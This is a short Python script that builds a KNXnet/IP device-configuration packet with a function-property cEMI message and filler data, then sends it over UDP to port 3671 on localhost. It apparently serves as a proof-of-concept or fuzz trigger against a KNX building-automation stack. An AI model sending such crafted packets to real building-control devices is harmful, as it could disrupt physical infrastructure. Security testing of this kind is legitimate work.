import socket

ip = "localhost"
port = 3671

fixed_header = bytearray.fromhex("0610")
service_id = bytearray.fromhex("0310")
total_length = bytearray.fromhex("0000") # Update later
kip_header = fixed_header + service_id + total_length

connection_header_length = bytearray.fromhex("04")
connection_header_channel_id = bytearray.fromhex("01")
connection_header_seq = bytearray.fromhex("00")
connection_header_reserved = bytearray.fromhex("00")
kip_connection_header = connection_header_length + connection_header_channel_id + connection_header_seq + connection_header_reserved

cemi_code = bytearray.fromhex("f8")
cemi_object_type = bytearray.fromhex("0000")
cemi_object_instance = bytearray.fromhex("00")
cemi_pid = bytearray.fromhex("33")
cemi_data = bytearray.fromhex("aaaa")
kip_cemi = cemi_code + cemi_object_type + cemi_object_instance + cemi_pid + cemi_data

# Fix total length field
total_length_int = len(kip_header + kip_connection_header + kip_cemi)
total_length = bytearray.fromhex("%.4x" % total_length_int)

# Fix header
kip_header = fixed_header + service_id + total_length

# Craft final payload
kip_payload = kip_header + kip_connection_header + kip_cemi

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((ip, port))
s.send(kip_payload)
s.close()